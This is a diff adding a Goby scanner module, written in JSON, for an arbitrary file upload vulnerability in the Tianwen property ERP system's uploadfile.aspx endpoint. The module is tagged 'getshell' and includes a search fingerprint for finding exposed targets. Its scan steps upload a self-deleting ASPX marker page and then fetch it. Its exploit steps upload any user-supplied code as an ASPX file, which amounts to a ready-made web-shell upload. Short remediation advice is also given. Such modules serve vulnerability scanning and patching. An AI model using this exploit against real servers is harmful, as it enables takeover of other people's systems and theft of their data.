@@ -1,0 +1,139 @@
+{
+      "Name": "Tianwen ERP system  uploadfile.aspx Arbitraryvfilevupload",
+      "Level": "3",
+      "Tags": [
+            "getshell"
+      ],
+      "GobyQuery": "body=\"天问物业ERP系统\"",
+      "Description": "/HM/M_Main/uploadfile.aspx An arbitrary file upload vulnerability exists",
+      "Product": "Tianwen ERP system",
+      "Homepage": "https://gobies.org/",
+      "Author": "http://www.tw369.com",
+      "Impact": "<p>The attacker can use this vulnerability to upload malicious files, control server permissions, and obtain sensitive system information.&nbsp;&nbsp;<br></p>",
+      "Recommendation": "<p>1. Verify the uploaded file type. In addition to the front-end verification, the backend can be verified by extension detection, rename files, MIME type detection and limit the size of uploaded files to defend, or upload files to other file storage servers.&nbsp;&nbsp;</p><p>2. Strictly restrict and verify uploaded files, and prohibit uploading files with malicious codes.&nbsp;&nbsp;In addition, the execution permission of the directory for uploading files is restricted to prevent Trojan horses from running.&nbsp;&nbsp;</p><p>3. Verify the format of uploaded files strictly to prevent malicious script files from being uploaded;&nbsp;&nbsp;</p><p>4. Strictly restrict the path of uploaded files.&nbsp;&nbsp;</p><p>5. Verify file name extension server whitelist.&nbsp;&nbsp;</p><p>6. Verify file content on the server.&nbsp;&nbsp;</p><p>7. Upload the file and rename it. &nbsp;</p><p>&nbsp;</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Code",
+                  "Type": "input",
+                  "Value": ""
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/HM/M_Main/uploadfile.aspx",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarytKnDdPq6SMXufwyT"
+                        },
+                        "data_type": "text",
+                        "data": "------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\n/wEPDwUKLTg1NDU3MTA4OQ9kFgICAQ8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk70CKfgUcso35StfmoNB/ObwwU8W4qvmgqa52HxmqsU0=\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\n\nDE1005D5\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\n\n/wEdAAIk02sIXo/TRIPUygBB64GvmW/ynBkkkA2xI95ik8Vs4GXPPWvIYnA84468jdc5Wr+nrufsSY+RKtcm7vKIotDs\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"BtnSave\"\n\n确定上传\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"upload_img\"; filename=\"1.aspx\"\nContent-Type: application/octet-stream\n\n<%@Page Language=\"C#\"%>\n<%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"{{{enbs4str1}}}\"))); System.IO.File.Delete(Request.PhysicalPath);%>\n\n------WebKitFormBoundarytKnDdPq6SMXufwyT\n",
+                        "set_variable": [
+                              "str2|rand|str|4",
+                              "enbs4str1|define|base64|str2"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "UploadCallBack",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "shell_url|lastbody|regex|\\('(.*)'\\)"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "{{{shell_url}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{str2}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/HM/M_Main/uploadfile.aspx",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarytKnDdPq6SMXufwyT"
+                        },
+                        "data_type": "text",
+                        "data": "------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\n/wEPDwUKLTg1NDU3MTA4OQ9kFgICAQ8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk70CKfgUcso35StfmoNB/ObwwU8W4qvmgqa52HxmqsU0=\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\n\nDE1005D5\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\n\n/wEdAAIk02sIXo/TRIPUygBB64GvmW/ynBkkkA2xI95ik8Vs4GXPPWvIYnA84468jdc5Wr+nrufsSY+RKtcm7vKIotDs\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"BtnSave\"\n\n确定上传\n------WebKitFormBoundarytKnDdPq6SMXufwyT\nContent-Disposition: form-data; name=\"upload_img\"; filename=\"1.aspx\"\nContent-Type: application/octet-stream\n\n{{{Code}}}\n\n------WebKitFormBoundarytKnDdPq6SMXufwyT\n",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|\\('(.*)'\\)"
+                  ]
+            }
+      ],
+      "PostTime": "2021-10-25 17:37:43",
+      "GobyVersion": "1.9.304"
+}
